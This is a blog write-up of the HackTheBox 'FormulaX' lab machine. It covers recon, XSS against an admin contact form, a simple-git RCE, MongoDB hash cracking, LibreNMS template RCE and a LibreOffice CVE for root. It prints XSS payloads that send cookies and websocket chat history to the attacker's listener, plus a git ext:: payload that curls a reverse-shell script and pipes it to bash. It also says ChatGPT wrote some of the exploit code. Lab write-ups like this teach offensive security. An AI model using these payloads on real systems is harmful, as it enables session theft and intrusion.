@@ -1,0 +1,128 @@
+---
+title: HTB Hard Box just requires perseverance (and ChatGPT's help) - Writeup for HTB's FormulaX
+date: '2024-06-26'
+tags: ['writeups', 'HTB', 'web', 'privesc']
+draft: false
+summary: XSS -> Secret subdomain -> Simple-Git RCE to foothold -> MongoDB cred for user flag -> Librenms shell to leak creds for lateral movement -> LibreOffice Calc RCE to root
+---
+
+Difficulty: Hard
+
+## Enumeration
+My go-to enumeration for a standard Linux box is **dirsearch** + **rustscan** + **nmap** + **ffuf (subdomain)**. I'll go to the web interface and check **Wappalyzer**, **retire.js** and some other extensions. I made the enumeration a bit faster with this script, viewing everything in 4 panes
+
+```
+#!/bin/bash
+
+# Function to display usage
+usage() {
+  echo "Quick tedious recon for HackTheBox boxes"
+  echo "Usage: $0 <IP_ADDRESS> <BASE_DOMAIN>"
+  exit 1
+}
+
+# Check if the correct number of arguments are provided
+if [ "$#" -ne 2 ]; then
+  usage
+fi
+
+IP_ADDRESS=$1
+BASE_DOMAIN=$2
+
+# Validate IP Address format
+if ! [[ $IP_ADDRESS =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+  echo "Invalid IP address format."
+  usage
+fi
+
+# Validate Base Domain format (basic validation)
+if ! [[ $BASE_DOMAIN =~ ^[a-zA-Z0-9.-]+$ ]]; then
+  echo "Invalid base domain format."
+  usage
+fi
+
+# Output the provided inputs
+echo "IP Address: $IP_ADDRESS"
+echo "Base Domain: $BASE_DOMAIN"
+
+tmux new -s '2x2 panes' \; \
+  split-window -h \; \
+  split-window -v \; \
+  select-pane -t 0 \; \
+  split-window -v \; \
+  send-keys -t 0 "sleep 5;dirsearch -u http://$BASE_DOMAIN; dirsearch -u http://$BASE_DOMAIN -m POST; dirsearch -u http://$IP_ADDRESS; dirsearch -u http://$IP_ADDRESS -m POST" C-m \; \
+  send-keys -t 1 "sleep 5;rustscan -a $IP_ADDRESS -r 1-65535 --ulimit 5000" C-m \; \
+  send-keys -t 2 "sleep 5;nmap -A $IP_ADDRESS" C-m \; \
+  send-keys -t 3 "sleep 5;size=\$(curl -s http://$IP_ADDRESS -L | wc -c) && ffuf -u http://$IP_ADDRESS -H 'Host: FUZZ.$BASE_DOMAIN' -w /home/vinh/important/vhost_lite.txt -r -fs \${size}" C-m \; \
+  attach
+
+```
+
+So there's *login*, *logout*, *register* and all sort, but the strange thing is that everything that starts with **/admin** returns a 200. I went to check and confirmed that it's a false positive returning a message like this:
+
+```
+{"Status":"Failed","Message":"No token found"}
+```
+
+Well fine, I just registered a user to check other functionality. There's a javascript file handling redirection, which checks whether a parameter returned by the server is "loggedin" or "admin". I tried intercepting it, but the redirection still failed, which means there were server-side checks as well.
+
+The page for regular users consists of 2 functionalities: a chatbot interface implemented with a socket.js doing web socket stuff, made me think of CSRF for a bit. Not that vulnerability in particular, but the js file would be utilized in later parts. The chatbot only has 1 userful command "history" where it replays all the previous commands. The other one is a "contact_us" form, which you can send some stuff to the admin. XSS?
+
+## XSS
+Quickly put up a listener and try to see if I can get a POC XSS. This is my first payload:
+```
+<img src=x onerror="fetch('http://10.10.XX.XX:8888?cookie=' + document.cookie)">
+```
+
+which received:
+```
+::ffff:10.10.11.6 - - [25/Jun/2024 10:03:33] code 501, message Unsupported method ('OPTIONS')
+::ffff:10.10.11.6 - - [25/Jun/2024 10:03:33] "OPTIONS /?cookie= HTTP/1.1" 501 -
+```
+
+So XSS works but no cookie exfiltrated? I guessed that it could be 1 of 2 reasons: HttpOnly cookies or there's no cookie (more unlikely).
+I decided to spend my GPT-4o daily limit wisely and ask the LLM how to proceed. Surprisingly it suggested a useful option: Leaking the DOM and proceed. 
+
+Replaced document.cookie with "encodeURIComponent(document.documentElement.innerHTML)" to get the page, and indeed it's an admin page. After using the same payload to get "./admin.js" and other stuff, I remembered that there's this "history" command. Maybe I can leak something? Thus I provided ChatGPT with the context about the history command, script that normal users used, and it gave me this final payload:
+
+```
+<img src="x" onerror="
+(function() {
+    // Create a new WebSocket connection using the same URL as the original script
+    const socket = io('/', { withCredentials: true });
+    
+    // Listen for messages from the server
+    socket.on('message', (my_message) => {
+        // Send the received message to the attacker's server
+        fetch('http://10.10.XX.XX:8888?message=' + encodeURIComponent(my_message));
+    });
+
+    // Send the 'history' message to the server
+    socket.emit('client_message', 'history');
+})();
+">
+```
+
+Decoding stuff leaks the existence of a secret subdomain: "dev-git-auto-update.chatbot.htb". At the bottom I saw "simple-git v3.14". CVE time gave me a known git exploit that I've done in a seasonal box not long before. When the git wrapper allowed all [remote extension](https://git-scm.com/docs/git-remote-ext), one can easily used it for RCE. I setup a bash reverse shell script on my server, and used this payload for the git RCE:
+```
+ext::sh -c curl% [MYSERVER]/[REVERSE-SHELL]|bash%
+```
+
+And I got www-data.
+
+### Note: Web exploit is done from here so I'll just go brief and mentioned mosty tips and tricks
+
+## User 1
+Typical HTB style is to check the web source code for database connections, connect to that DB, get the hash, crack it and get user. Did just that LMAO. It's a MongoDB server so I had to checkup the CLI documentation a bit, but getting and cracking the bcrypt hash was easy.
+
+## LibreNMS to User 2
+On port 3000 is this [LibreNMS network monitoring stuff](https://www.librenms.org/). I port-forwarded that to localhost to see the website. No default creds work to login, but I found a way to create new admin user via a script. [W forum](https://community.librenms.org/t/adding-admin-users-on-librenms/20782). Ofcourse I'm going with **b01lers b01lers**. OK and then I don't know why this Libremns has a template that can do RCE. It's Laravel Blade so I just searched up the syntax a bit. Not much needed, just get system() to run LMAO. This user provides creds for another user.
+
+## Final privilege escalation to root. 
+It's just this [CVE Unathenticated RCE on LibreOffice](https://www.exploit-db.com/exploits/46544). Fun thing is that when I asked chatGPT about it, it actually spitted out some exploit code that is almost correct. Wonder what isn't fed into this thing.
+
+## Final thought
+Took me a whole day to crack this box. Very exhausting, but good stuff are learned along the way!
+
+
+
